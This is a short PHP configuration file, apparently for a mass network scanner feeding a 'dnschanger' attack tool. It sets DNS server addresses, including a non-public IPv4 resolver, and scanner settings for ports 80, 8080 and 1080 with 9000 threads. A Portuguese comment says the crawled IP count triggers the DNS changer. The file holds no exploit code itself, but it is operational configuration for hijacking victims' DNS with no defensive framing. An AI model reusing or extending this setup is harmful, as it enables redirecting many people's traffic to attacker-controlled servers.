<?php


$Configs["DNS"]["Servers"]["IPV4"][1]	= "107.155.152.15";
$Configs["DNS"]["Servers"]["IPV4"][2]	= "8.8.4.4";
$Configs["DNS"]["Servers"]["IPV6"][1]	= "0:0:0:0:0:ffff:b946:ba04";
$Configs["DNS"]["Servers"]["IPV6"][2]	= "0:0:0:0:0:ffff:b946:ba07";
//
$Configs["Scanner"]["Ports"]	        = array ( 80 ,8080,1080, );
$Configs["Scanner"]["Threads"]	        = 9000;
$Configs["Scanner"]["Instances"]        = 30;
$Configs["Scanner"]["MaxCrawled"]       = rand(500,50000); // Numeros de ips necessarios para iniciar o dnschanger


